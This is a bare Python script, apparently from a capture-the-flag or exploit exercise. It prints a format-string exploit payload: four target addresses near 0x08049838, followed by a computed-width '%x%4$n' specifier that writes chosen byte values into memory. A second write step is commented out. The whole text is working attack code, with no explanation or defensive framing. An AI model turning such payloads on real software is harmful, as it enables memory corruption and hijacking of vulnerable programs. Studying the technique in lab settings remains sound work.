addr_1 = "\x38\x98\x04\x08"
addr_2 = "\x39\x98\x04\x08"
addr_3 = "\x3A\x98\x04\x08"
addr_4 = "\x3B\x98\x04\x08"

value_1 = 0x38
value_2 = 0x98
value_3 = 0x04
value_4 = 0x08

inject_1 = value_1 - (0x04 * 4)
inject_2 = 256 + value_2 - inject_1 - (0x04 * 4)

form = '%' + str(inject_1) + 'x%4$n'
# form += '%' + str(inject_2) + 'x%n'

print(addr_1 + addr_2 + addr_3 + addr_4 + form)
